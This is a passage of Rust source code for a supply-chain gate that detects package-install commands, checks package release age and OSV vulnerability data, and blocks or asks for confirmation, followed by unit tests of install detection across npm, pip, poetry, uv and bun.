            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' | b'/' | b'@' => {
                (b as char).to_string()
            }
            _ => format!("%{:02X}", b),
        })
        .collect()
}

/// Query OSV.dev for any vulns affecting (ecosystem, package, version).
/// Returns (id, summary, severity) per vuln so callers can apply a threshold.
fn osv_query(
    eco: Ecosystem,
    pkg: &str,
    version: &str,
) -> Result<Vec<(String, String, Severity)>, String> {
    let body = serde_json::json!({
        "package": { "name": pkg, "ecosystem": eco.as_str() },
        "version": version
    });
    let v = http_post_json("https://api.osv.dev/v1/query", &body)?;
    let vulns = v
        .get("vulns")
        .and_then(|x| x.as_array())
        .cloned()
        .unwrap_or_default();
    Ok(vulns
        .iter()
        .filter_map(|vuln| {
            let id = vuln.get("id").and_then(|x| x.as_str())?.to_string();
            let summary = vuln
                .get("summary")
                .and_then(|x| x.as_str())
                .unwrap_or("(no summary)")
                .to_string();
            let severity = osv_severity(vuln);
            Some((id, summary, severity))
        })
        .collect())
}

/// Extract a CVSS-style severity from an OSV vuln record. Best-effort.
fn osv_severity(vuln: &Value) -> Severity {
    if let Some(arr) = vuln.get("severity").and_then(|x| x.as_array()) {
        for entry in arr {
            if let Some(score) = entry.get("score").and_then(|x| x.as_str()) {
                if score.contains("CRITICAL") {
                    return Severity::Critical;
                } else if score.contains("HIGH") {
                    return Severity::High;
                } else if score.contains("MEDIUM") || score.contains("MODERATE") {
                    return Severity::Medium;
                } else if score.contains("LOW") {
                    return Severity::Low;
                }
            }
        }
    }
    if let Some(arr) = vuln.get("database_specific").and_then(|x| x.as_object()) {
        if let Some(sev) = arr.get("severity").and_then(|x| x.as_str()) {
            if let Some(parsed) = Severity::parse(sev) {
                return parsed;
            }
        }
    }
    // Default if unknown: assume HIGH so it doesn't silently slip past a HIGH threshold.
    Severity::High
}

fn collect_osv_findings(
    result: Result<Vec<(String, String, Severity)>, String>,
    package: &str,
    ecosystem: Ecosystem,
    block_threshold: Severity,
    findings: &mut Vec<Finding>,
) -> Result<(), String> {
    let vulns = result.map_err(|error| {
        format!(
            "OSV lookup failed for {}: {}",
            crate::core::secret_redact::redact(package),
            crate::core::secret_redact::redact(&error)
        )
    })?;
    for (id, summary, severity) in vulns {
        if severity >= block_threshold {
            findings.push(Finding {
                package: crate::core::secret_redact::redact(package).into_owned(),
                ecosystem: ecosystem.as_str().to_string(),
                reason: FindingReason::KnownVulnerability {
                    id: crate::core::secret_redact::redact(&id).into_owned(),
                    summary: crate::core::secret_redact::redact(&summary).into_owned(),
                },
                severity,
            });
        }
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Cache (24h, file-based)
// ---------------------------------------------------------------------------

fn cache_dir() -> Option<PathBuf> {
    dirs::cache_dir().map(|d| d.join("contextcrawler").join("supply-chain"))
}

fn cache_file(eco: Ecosystem, pkg: &str) -> Option<PathBuf> {
    // Refuse anything that could escape the cache directory or smuggle a
    // path separator the caller didn't anticipate. Real npm/pypi names
    // are an allowlist of [A-Za-z0-9._@/-]; we additionally reject `..`
    // sequences and any backslash. If we can't represent the name
    // safely we skip the cache (worst case: re-query the registry).
    if pkg.is_empty()
        || pkg.contains("..")
        || pkg.contains('\\')
        || pkg
            .chars()
            .any(|c| c.is_control() || c == ':' || c == '*' || c == '?')
    {
        return None;
    }
    let safe = pkg.replace('/', "_").replace('@', "_at_");
    cache_dir().map(|d| d.join(format!("{}-{}.json", eco.as_str(), safe)))
}

#[derive(Debug, Serialize, Deserialize)]
struct CacheEntry {
    version: String,
    publish_time: String,
    fetched_at: String,
}

fn cache_get(eco: Ecosystem, pkg: &str) -> Option<(String, DateTime<Utc>)> {
    let path = cache_file(eco, pkg)?;
    cache_get_at(&path)
}

fn cache_get_at(path: &std::path::Path) -> Option<PackageMetadata> {
    let content = fs::read_to_string(path).ok()?;
    let entry: CacheEntry = serde_json::from_str(&content).ok()?;
    let fetched = parse_iso8601(&entry.fetched_at).ok()?;
    if (Utc::now() - fetched) > ChronoDuration::hours(24) {
        return None;
    }
    let publish = parse_iso8601(&entry.publish_time).ok()?;
    Some((entry.version, publish))
}

fn write_private_atomic(path: &std::path::Path, content: &[u8]) -> std::io::Result<()> {
    let parent = path.parent().ok_or_else(|| {
        std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            format!("{} has no parent directory", path.display()),
        )
    })?;
    fs::create_dir_all(parent)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(parent, fs::Permissions::from_mode(0o700))?;
    }

    let mut temporary = tempfile::NamedTempFile::new_in(parent)?;
    temporary.write_all(content)?;
    temporary.flush()?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        temporary
            .as_file()
            .set_permissions(fs::Permissions::from_mode(0o600))?;
    }
    temporary.as_file().sync_all()?;
    temporary.persist(path).map_err(|error| error.error)?;
    Ok(())
}

fn cache_put_at(path: &std::path::Path, entry: &CacheEntry) -> Result<(), String> {
    let json = serde_json::to_vec(entry).map_err(|error| error.to_string())?;
    write_private_atomic(path, &json).map_err(|error| error.to_string())
}

fn cache_put(eco: Ecosystem, pkg: &str, version: &str, publish: &DateTime<Utc>) {
    let Some(path) = cache_file(eco, pkg) else {
        return;
    };
    let entry = CacheEntry {
        version: version.to_string(),
        publish_time: publish.to_rfc3339(),
        fetched_at: Utc::now().to_rfc3339(),
    };
    let _ = cache_put_at(&path, &entry);
}

// ---------------------------------------------------------------------------
// Public entry points
// ---------------------------------------------------------------------------

/// Inspect a shell command. Returns Skip if not an install / gate disabled.
pub fn check(cmd: &str) -> Verdict {
    let config = load_config();
    if !config.supply_chain.enabled {
        return Verdict::Skip;
    }
    if std::env::var("CONTEXTCRAWLER_SUPPLY_CHAIN").as_deref() == Ok("off") {
        return Verdict::Skip;
    }
    check_with_config(cmd, config)
}

/// Testable policy core. Command text is intentionally not an authority for
/// disabling the hook: a leading assignment applies only to the command the
/// hook is inspecting, not to the already-running hook process (#227).
fn check_with_config(cmd: &str, config: &Config) -> Verdict {
    if !config.supply_chain.enabled {
        return Verdict::Skip;
    }

    let installs = detect_installs(cmd);
    if installs.is_empty() {
        return Verdict::Skip;
    }

    // SEC-I2: package-count cap. A command installing more distinct packages
    // than we can vet within budget is failed closed to Ask rather than
    // issuing dozens of serial registry/OSV requests.
    let total_packages: usize = installs.iter().map(|i| i.packages.len()).sum();
    if total_packages > MAX_PACKAGES_PER_CHECK {
        return Verdict::Ask(vec![Finding {
            package: format!("<{} packages>", total_packages),
            ecosystem: "multiple".to_string(),
            reason: FindingReason::UnvettableInstall {
                detail: format!(
                    "install lists {} packages — more than the {} the gate will vet \
                     in one command. Confirm to proceed, or split the install.",
                    total_packages, MAX_PACKAGES_PER_CHECK
                ),
            },
            severity: Severity::Medium,
        }]);
    }

    // SEC-I2: aggregate wall-clock budget. Each registry/OSV call has its own
    // 8s timeout; this deadline bounds the whole `check()` so a slow/hostile
    // registry cannot stall the hook for minutes.
    let started = Instant::now();
    let budget_exceeded = || started.elapsed() >= CHECK_WALL_BUDGET;

    let mut findings = Vec::new();
    // Findings that should downgrade to Ask (fail-closed-to-confirm) rather
    // than a hard Block. An unvettable install (lockfile / requirements file)
    // is not a known-bad package — we just can't enumerate what it pulls.
    let mut ask_findings = Vec::new();
    let mut transient_err: Option<String> = None;
    // Set when the wall-clock budget runs out mid-vetting. The remaining
    // packages are unvetted, so we fail closed.
    let mut budget_blown = false;

    for install in installs {
        if budget_exceeded() {
            budget_blown = true;
            break;
        }
        let eco_cfg = match install.ecosystem {
            Ecosystem::Npm => &config.npm,
            Ecosystem::Pypi => &config.pypi,
            // Unknown is always paired with `unvettable: Some(...)` which
            // short-circuits to Ask above this point — so this arm is
            // unreachable in practice. Fall back to npm config for the
            // benefit of any future code path that surfaces Unknown
            // without the unvettable shortcut.
            Ecosystem::Unknown => &config.npm,
        };
        let block_threshold = Severity::parse(&eco_cfg.block_severity).unwrap_or(Severity::High);

        // Install verb detected but the package set is unvettable: it comes
        // from a lockfile / requirements / constraints file the gate cannot
        // enumerate. Surface it (fail closed to Ask) instead of dropping the
        // install silently as a Skip — see #111 G1.
        if let Some(detail) = &install.unvettable {
            ask_findings.push(Finding {
                package: "<lockfile / requirements install>".to_string(),
                ecosystem: install.ecosystem.as_str().to_string(),
                reason: FindingReason::UnvettableInstall {
                    detail: detail.clone(),
                },
                severity: Severity::Medium,
            });
        }

        // Editable / path / URL token detected. If the ecosystem disallows
        // these (default for npm), we can't query a registry for that
        // source — surface a finding so the user reviews manually. Either
        // way we fall through and still vet any sibling named packages
        // (e.g. `pip install -e . requests` must still check `requests`).
        if install.has_editable && !eco_cfg.allow_editable {
            findings.push(Finding {
                package: "<editable / path / url>".to_string(),
                ecosystem: install.ecosystem.as_str().to_string(),
                reason: FindingReason::UnvettableSource {
                    token_kind: "editable_or_url".to_string(),
                },
                severity: Severity::High,
            });
        }

        // Dedupe within an install: pip install foo bar foo -> check foo once.
        let mut seen = std::collections::HashSet::<(String, Option<String>)>::new();
        for (pkg, pinned) in install.packages {
            // SEC-I2: stop vetting once the aggregate budget is spent. The
            // remaining packages are unvetted — fail closed below.
            if budget_exceeded() {
                budget_blown = true;
                break;
            }

            let key = (pkg.clone(), pinned.clone());
            if !seen.insert(key) {
                continue;
            }

            if matches_override(&pkg, &config.overrides.always_allow) {
                continue;
            }
            if matches_override(&pkg, &config.overrides.always_deny) {
                findings.push(Finding {
                    package: pkg.clone(),
                    ecosystem: install.ecosystem.as_str().to_string(),
                    reason: FindingReason::RecentRelease {
                        age_days: 0.0,
                        cooldown_days: 0,
                        version: "*".into(),
                    },
                    severity: Severity::Critical,
                });
                continue;
            }

            // Age check against (resolved or pinned) version
            let registry_result = match install.ecosystem {
                Ecosystem::Npm => npm_metadata(&pkg, pinned.as_deref(), eco_cfg.cooldown_days),
                Ecosystem::Pypi => pypi_metadata(&pkg, pinned.as_deref(), eco_cfg.cooldown_days),
                // Defensive: Unknown installs always have `unvettable:
                // Some(...)` + empty packages, so this loop body never
                // runs for them. If a future code path constructs an
                // Unknown with packages, surface as transient so the
                // caller fails to Ask/Unavailable instead of misrouting.
                Ecosystem::Unknown => {
                    Err("ecosystem-agnostic install — no registry to query".to_string())
                }
            };
            let (version, publish) = match registry_result {
                Ok(v) => v,
                Err(e) => {
                    transient_err.get_or_insert(e);
                    continue;
                }
            };
            // SEC-I2: a registry-metadata call can itself take seconds. Re-check
            // the budget immediately after it so a single slow network call
            // cannot push us past the deadline before the next loop top.
            if budget_exceeded() {
                budget_blown = true;
                break;
            }
            // Clamp negative ages (registry/publisher clock skew, or a
            // genuinely future-dated entry) to zero so they always fall
            // below the cooldown threshold instead of skating past both
            // bounds of the old `> -1d` guard.
            let age = (Utc::now() - publish).max(ChronoDuration::zero());
            if age < ChronoDuration::days(eco_cfg.cooldown_days as i64) {
                findings.push(Finding {
                    package: pkg.clone(),
                    ecosystem: install.ecosystem.as_str().to_string(),
                    reason: FindingReason::RecentRelease {
                        age_days: age.num_seconds() as f64 / 86_400.0,
                        cooldown_days: eco_cfg.cooldown_days,
                        version: version.clone(),
                    },
                    severity: Severity::High,
                });
            }

            // CVE check against the specific resolved/pinned version. OSV is
            // part of the allow decision; any lookup/parse failure leaves the
            // package unvetted and therefore must surface as Unavailable.
            if let Err(error) = collect_osv_findings(
                osv_query(install.ecosystem, &pkg, &version),
                &pkg,
                install.ecosystem,
                block_threshold,
                &mut findings,
            ) {
                transient_err.get_or_insert(error);
            }
            // SEC-I2: an osv_query can take up to ~8s. Re-check the budget
            // right after it so the deadline cannot be overrun by a full slow
            // OSV call per package before the loop top is reached again.
            if budget_exceeded() {
                budget_blown = true;
                break;
            }
        }
    }

    // A hard Block (known-bad package / failed gate) outranks everything:
    // a package we positively identified as bad stays blocked even if the
    // budget later ran out.
    if !findings.is_empty() {
        return Verdict::Block(findings);
    }
    // SEC-I2: the wall-clock budget ran out before every package was vetted.
    // The remainder is unvetted, so fail closed rather than waving it through.
    if budget_blown {
        let budget_msg = format!(
            "vetting budget exceeded ({}s) — install not fully vetted",
            CHECK_WALL_BUDGET.as_secs()
        );
        // If we already accumulated Ask findings (e.g. an unvettable lockfile
        // install) before the budget expired, do not discard them: surface
        // them as Ask so the user sees the real concern, with an extra
        // finding noting the budget was exceeded so later packages went
        // unvetted. Block still outranks this (handled above).
        if !ask_findings.is_empty() {
            ask_findings.push(Finding {
                package: "<vetting budget exceeded>".to_string(),
                ecosystem: "*".to_string(),
                reason: FindingReason::UnvettableInstall { detail: budget_msg },
                severity: Severity::Medium,
            });
            return Verdict::Ask(ask_findings);
        }
        return Verdict::Unavailable(budget_msg);
    }
    if let Some(e) = transient_err {
        return Verdict::Unavailable(e);
    }
    // No hard findings, but one or more installs are unvettable — fail closed
    // to Ask so the user confirms the unvetted package set.
    if !ask_findings.is_empty() {
        return Verdict::Ask(ask_findings);
    }
    Verdict::Allow
}

fn matches_override(pkg: &str, patterns: &[String]) -> bool {
    for pat in patterns {
        if let Some(prefix) = pat.strip_suffix("/*") {
            if pkg.starts_with(prefix) && pkg.len() > prefix.len() {
                return true;
            }
        } else if pat == pkg {
            return true;
        }
    }
    false
}

/// Whether a verdict is worth persisting to the supply-chain event log.
///
/// `Verdict::Skip` means "gate disabled or no install command found" — it fires
/// for *every* ordinary shell command (grep/git/ls/...), so logging it is pure
/// noise that grows the log unbounded with zero analytic value (issue #190).
/// Real gate decisions (`Allow`/`Block`/`Ask`/`Unavailable`) are always kept.
pub(crate) fn should_log(verdict: &Verdict) -> bool {
    !matches!(verdict, Verdict::Skip)
}

fn sanitise_finding(finding: &Finding) -> Finding {
    let redact = |value: &str| crate::core::secret_redact::redact(value).into_owned();
    Finding {
        package: redact(&finding.package),
        ecosystem: redact(&finding.ecosystem),
        reason: match &finding.reason {
            FindingReason::RecentRelease {
                age_days,
                cooldown_days,
                version,
            } => FindingReason::RecentRelease {
                age_days: *age_days,
                cooldown_days: *cooldown_days,
                version: redact(version),
            },
            FindingReason::KnownVulnerability { id, summary } => {
                FindingReason::KnownVulnerability {
                    id: redact(id),
                    summary: redact(summary),
                }
            }
            FindingReason::UnvettableSource { token_kind } => FindingReason::UnvettableSource {
                token_kind: redact(token_kind),
            },
            FindingReason::UnvettableInstall { detail } => FindingReason::UnvettableInstall {
                detail: redact(detail),
            },
        },
        severity: finding.severity,
    }
}

fn append_private_audit_record(path: &std::path::Path, record: &str) -> std::io::Result<()> {
    let mut options = fs::OpenOptions::new();
    options.create(true).append(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        options
            .mode(0o600)
            .custom_flags(libc::O_NOFOLLOW | libc::O_CLOEXEC);
    }
    let mut file = options.open(path)?;
    let metadata = file.metadata()?;
    if !metadata.is_file() {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidInput,
            format!("{} is not a regular file", path.display()),
        ));
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        if metadata.nlink() != 1 {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                format!("{} has multiple hard links", path.display()),
            ));
        }
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        file.set_permissions(fs::Permissions::from_mode(0o600))?;
    }
    writeln!(file, "{}", record)
}

/// Append a gate event to the local log for `contextcrawler security --supply-chain-log`.
pub fn log_event(cmd: &str, verdict: &Verdict) {
    // Suppress the no-install `Skip` firehose (#190) before any I/O.
    if !should_log(verdict) {
        return;
    }
    let Some(data_dir) = dirs::data_local_dir() else {
        return;
    };
    let dir = data_dir.join("contextcrawler");
    if fs::create_dir_all(&dir).is_err() {
        return;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if fs::set_permissions(&dir, fs::Permissions::from_mode(0o700)).is_err() {
            return;
        }
    }
    let path = dir.join("supply_chain.jsonl");
    let kind = match verdict {
        Verdict::Skip => "skip",
        Verdict::Allow => "allow",
        Verdict::Block(_) => "block",
        Verdict::Ask(_) => "ask",
        Verdict::Unavailable(_) => "unavailable",
    };
    let findings = match verdict {
        Verdict::Block(f) | Verdict::Ask(f) => {
            let safe = f.iter().map(sanitise_finding).collect::<Vec<_>>();
            serde_json::to_string(&safe).unwrap_or_default()
        }
        _ => "[]".to_string(),
    };
    // Scrub credentials before the cmd lands on disk. See issue #180.
    let safe_cmd = crate::core::secret_redact::redact(cmd);
    let record = format!(
        r#"{{"ts":"{}","verdict":"{}","cmd":{},"findings":{}}}"#,
        Utc::now().to_rfc3339(),
        kind,
        serde_json::to_string(safe_cmd.as_ref()).unwrap_or_else(|_| "\"\"".into()),
        findings
    );
    let _ = append_private_audit_record(&path, &record);
}

/// Render a Verdict as a human-readable explanation (for hook warnings and CLI).
pub fn render(verdict: &Verdict) -> String {
    match verdict {
        Verdict::Skip => {
            "[contextcrawler supply-chain] skipped (gate disabled or no install command)".into()
        }
        Verdict::Allow => "[contextcrawler supply-chain] all packages passed".into(),
        Verdict::Unavailable(e) => format!(
            "[contextcrawler supply-chain] WARN — gate unavailable ({}). \
             Failing closed: auto-allow downgraded to Ask.",
            crate::core::secret_redact::redact(e)
        ),
        Verdict::Block(findings) => {
            let mut s = String::from("[contextcrawler supply-chain] BLOCKED\n");
            s.push_str(&render_findings(findings));
            s.push_str("  Approve explicitly in the host, or add the package to\n");
            s.push_str("  ~/.config/contextcrawler/supply-chain.toml [overrides.always_allow].");
            s
        }
        Verdict::Ask(findings) => {
            let mut s = String::from(
                "[contextcrawler supply-chain] WARN — install set could not be vetted. \
                 Failing closed: auto-allow downgraded to Ask.\n",
            );
            s.push_str(&render_findings(findings));
            s.push_str("  Review the source, then confirm explicitly in the host to proceed.");
            s
        }
    }
}

/// Render a list of findings as indented human-readable lines.
fn render_findings(findings: &[Finding]) -> String {
    let mut s = String::new();
    for raw_finding in findings {
        let f = sanitise_finding(raw_finding);
        match &f.reason {
            FindingReason::RecentRelease {
                age_days,
                cooldown_days,
                version,
            } => {
                s.push_str(&format!(
                    "  {} [{}] @ {} published {:.2}d ago (cooldown {}d). Severity: {:?}\n",
                    f.package, f.ecosystem, version, age_days, cooldown_days, f.severity
                ));
            }
            FindingReason::KnownVulnerability { id, summary } => {
                s.push_str(&format!(
                    "  {} [{}]: {} — {} (severity {:?})\n",
                    f.package, f.ecosystem, id, summary, f.severity
                ));
            }
            FindingReason::UnvettableSource { token_kind } => {
                s.push_str(&format!(
                    "  {} [{}]: install command contained an {} token that the gate cannot query (severity {:?})\n",
                    f.package, f.ecosystem, token_kind, f.severity
                ));
            }
            FindingReason::UnvettableInstall { detail } => {
                s.push_str(&format!(
                    "  {} [{}]: {} (severity {:?})\n",
                    f.package, f.ecosystem, detail, f.severity
                ));
            }
        }
    }
    s
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn names(install: &ParsedInstall) -> Vec<&str> {
        install.packages.iter().map(|(n, _)| n.as_str()).collect()
    }

    #[test]
    fn should_log_suppresses_skip_keeps_real_verdicts() {
        // #190: `Skip` fires for every non-install command — must NOT be logged.
        assert!(
            !should_log(&Verdict::Skip),
            "Skip is the no-install firehose"
        );
        // Every real gate decision must still be persisted.
        assert!(should_log(&Verdict::Allow));
        assert!(should_log(&Verdict::Block(vec![])));
        assert!(should_log(&Verdict::Ask(vec![])));
        assert!(should_log(&Verdict::Unavailable("offline".into())));
    }

    #[test]
    fn load_config_caches_after_first_read() {
        // `load_config()` is backed by a process-lifetime OnceLock. Whatever
        // the first call resolves, every subsequent call must return the
        // exact same `&'static Config` — no second disk read. Comparing the
        // pointer identity proves the cache (not just value equality).
        let first = load_config() as *const Config;
        let second = load_config() as *const Config;
        let third = load_config() as *const Config;
        assert_eq!(first, second);
        assert_eq!(second, third);
    }

    #[test]
    fn detect_npm_install() {
        let v = detect_installs("npm install lodash express");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert_eq!(names(&v[0]), vec!["lodash", "express"]);
    }

    #[test]
    fn detect_pip_install_with_pin() {
        let v = detect_installs("pip install requests==2.31.0 numpy");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert_eq!(v[0].packages[0].0, "requests");
        assert_eq!(v[0].packages[0].1.as_deref(), Some("2.31.0"));
        assert_eq!(v[0].packages[1].0, "numpy");
        assert_eq!(v[0].packages[1].1, None);
    }

    #[test]
    fn detect_compound_install() {
        let v = detect_installs("cd foo && npm install x && pip install y");
        assert_eq!(v.len(), 2);
    }

    // ─── Absolute / relative path bypass regression ────────────────────────
    //
    // Invoking the package manager via an absolute or relative path —
    // `/Users/x/.nvm/.../bin/npm install foo`, `./bin/pnpm install bar` —
    // must NOT slip past the gate. The path separator before the install
    // verb has to count as a command-start delimiter (same role as a space
    // or `&&`). Empirically observed bypass on 2026-05-23; see the harden
    // commit. These tests pin the closure.

    #[test]
    fn abs_path_npm_install_detected() {
        let v = detect_installs(
            "/Users/x/.nvm/versions/node/v25.0.0/bin/npm install @earendil-works/pi-coding-agent",
        );
        assert_eq!(v.len(), 1, "abs-path npm install must be detected");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert_eq!(v[0].packages[0].0, "@earendil-works/pi-coding-agent");
    }

    #[test]
    fn abs_path_pnpm_install_detected() {
        let v = detect_installs("/usr/local/bin/pnpm install lodash");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert_eq!(names(&v[0]), vec!["lodash"]);
    }

    #[test]
    fn abs_path_yarn_add_detected() {
        let v = detect_installs("/opt/homebrew/bin/yarn add react");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert_eq!(names(&v[0]), vec!["react"]);
    }

    #[test]
    fn abs_path_pip_install_detected() {
        let v = detect_installs("/usr/bin/pip install requests");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert_eq!(names(&v[0]), vec!["requests"]);
    }

    #[test]
    fn abs_path_uv_install_detected() {
        let v = detect_installs("/Users/me/.cargo/bin/uv pip install requests");
        assert_eq!(v.len(), 1, "abs-path uv must be claimed by UV pattern");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
    }

    #[test]
    fn abs_path_poetry_add_detected() {
        let v = detect_installs("/opt/python/bin/poetry add httpx");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert_eq!(names(&v[0]), vec!["httpx"]);
    }

    #[test]
    fn abs_path_pipx_install_detected() {
        let v = detect_installs("/usr/local/bin/pipx install poetry");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert_eq!(names(&v[0]), vec!["poetry"]);
    }

    #[test]
    fn relative_path_npm_install_detected() {
        let v = detect_installs("./node_modules/.bin/npm install left-pad");
        assert_eq!(v.len(), 1);
        assert_eq!(names(&v[0]), vec!["left-pad"]);
    }

    #[test]
    fn abs_path_bare_npm_install_detected() {
        // Bare lockfile install via abs path — should still be classified as
        // an Unvettable npm install (see detect_bare_lockfile_installs).
        let v = detect_installs("/Users/x/.nvm/versions/node/v25/bin/npm install");
        assert_eq!(v.len(), 1, "bare abs-path npm install must be detected");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(
            v[0].unvettable.is_some(),
            "bare install has no named package, must surface as unvettable"
        );
    }

    // ─── Peer-review follow-ups (newline chain, Windows launchers,
    //     poetry/uv bare-install) ────────────────────────────────────────────

    #[test]
    fn newline_chain_both_installs_detected() {
        // BLOCKER (Antigravity peer review): `[^|;&<>]+` matched newlines, so
        // a multi-line script's first install greedily swallowed subsequent
        // lines and suppressed downstream detection. Newlines now end the
        // arg-capture and each line is its own install.
        let v = detect_installs("npm install left-pad\npip install requests");
        assert_eq!(
            v.len(),
            2,
            "newline must NOT chain-swallow: expected both installs, got {v:?}"
        );
        assert!(v.iter().any(|p| p.ecosystem == Ecosystem::Npm));
        assert!(v.iter().any(|p| p.ecosystem == Ecosystem::Pypi));
    }

    #[test]
    fn newline_chain_carriage_return_also_caught() {
        // Windows line endings (`\r\n`) — same guard must apply.
        let v = detect_installs("npm install left-pad\r\npip install requests");
        assert_eq!(v.len(), 2, "\\r\\n line ending must not chain: {v:?}");
    }

    #[test]
    fn windows_launcher_npm_cmd_detected() {
        let v = detect_installs("npm.cmd install lodash");
        assert_eq!(v.len(), 1, "npm.cmd install must classify as npm");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert_eq!(names(&v[0]), vec!["lodash"]);
    }

    #[test]
    fn windows_launcher_pip_exe_detected() {
        let v = detect_installs("pip.exe install requests");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert_eq!(names(&v[0]), vec!["requests"]);
    }

    #[test]
    fn windows_launcher_abs_path_npm_cmd_detected() {
        // Combined: Windows abs path + .cmd suffix.
        let v = detect_installs(r"C:\Tools\node\npm.cmd install lodash");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert_eq!(names(&v[0]), vec!["lodash"]);
    }

    #[test]
    fn windows_launcher_bare_npm_cmd_detected() {
        // Bare lockfile install via Windows launcher — basename strip must
        // drop .cmd before the token-match arm fires.
        let v = detect_installs("npm.cmd install");
        assert_eq!(v.len(), 1, "bare npm.cmd install must be detected");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn poetry_install_bare_lockfile_detected() {
        // `poetry install` resolves from pyproject.toml / poetry.lock with no
        // package args — silent Skip before, now surfaced as Pypi unvettable.
        let v = detect_installs("poetry install");
        assert_eq!(v.len(), 1, "poetry install must surface as bare lockfile");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn poetry_install_with_flags_still_bare_lockfile() {
        // Flags after the verb must not turn this into a named install.
        let v = detect_installs("poetry install --no-dev --no-interaction");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn poetry_add_still_handled_by_regex() {
        // Sanity: `poetry add` is package-bearing and must stay claimed by
        // POETRY_RE, not the new bare-install path.
        let v = detect_installs("poetry add httpx");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert_eq!(names(&v[0]), vec!["httpx"]);
    }

    #[test]
    fn uv_sync_bare_lockfile_detected() {
        let v = detect_installs("uv sync");
        assert_eq!(v.len(), 1, "uv sync must surface as bare lockfile");
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn uv_pip_sync_bare_lockfile_detected() {
        let v = detect_installs("uv pip sync");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn uv_abs_path_sync_detected() {
        let v = detect_installs("/Users/me/.cargo/bin/uv sync");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
    }

    #[test]
    fn abs_path_does_not_double_match_mid_path_substring() {
        // Defensive: `/some/random/path/install/notnpm.txt` mentions
        // "install" but contains no install verb. Must produce zero hits.
        let v = detect_installs("/some/random/path/install/notnpm.txt");
        assert!(v.is_empty(), "no install verb here, got: {:?}", v);
    }

    // ─── #144: bun / pdm / pipenv / conda / mamba install detection ─────────
    //
    // Before #144 these tools returned a silent Verdict::Skip (no vetting).
    // Each new tool gets: basic package-bearing detection, bare-lockfile
    // detection (where applicable), and adversarial head variants reusing the
    // shared anchor (abs path, Windows launcher, case-insensitivity,
    // line-continuation, quoted head). conda/mamba additionally assert the
    // result is unvettable (fail-closed to Ask), never vetted as real PyPI.

    // ── bun (JS/TS → npm) ──
    #[test]
    fn detect_bun_add() {
        let v = detect_installs("bun add left-pad");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn detect_bun_install_named() {
        let v = detect_installs("bun install lodash express");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn detect_bun_i_shorthand() {
        let v = detect_installs("bun i chalk");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn bun_install_bare_lockfile_detected() {
        // Bare `bun install` reads bun.lockb — no package arg → unvettable.
        let v = detect_installs("bun install");
        assert_eq!(v.len(), 1, "bare bun install must surface as lockfile");
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn bun_install_bare_with_flags_still_lockfile() {
        let v = detect_installs("bun install --frozen-lockfile");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
    }

    #[test]
    fn bun_abs_path_head_detected() {
        let v = detect_installs("/usr/bin/bun install left-pad");
        assert_eq!(v.len(), 1);
        assert_eq!(v[0].ecosystem, Ecosystem::Npm);
        assert!(v[0].unvettable.is_some());
        assert!(v[0].packages.is_empty());
    }

    #[test]
    fn bun_windows_launcher_detected() {
